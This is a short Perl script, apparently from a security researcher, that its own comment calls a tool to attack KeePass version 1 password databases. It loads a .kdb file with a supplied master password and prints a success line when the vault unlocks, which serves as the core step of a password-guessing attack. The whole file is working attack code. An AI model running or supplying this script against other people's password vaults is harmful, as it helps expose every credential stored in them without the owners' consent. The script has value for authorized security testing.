#!/usr/bin/perl
# ndrier@trustwave.com
# a simple script to attack keepass v1 files
# cpan install File::KeePass

use File::KeePass;

if ($#ARGV != 1) {
    print "usage: dump.pl database.kdb password\n";
    exit;
}

$file = $ARGV[0];
$master_pass = $ARGV[1];

my $k = File::KeePass->new;
if (! eval { $k->load_db($file, $master_pass) }) {
	die "Couldn't load the file $file:\n";
        #die "Couldn't load the file $file: $@";
}

$k->unlock;
if ($k->is_locked == 0) {
	print "Success! - $master_pass\n";
}

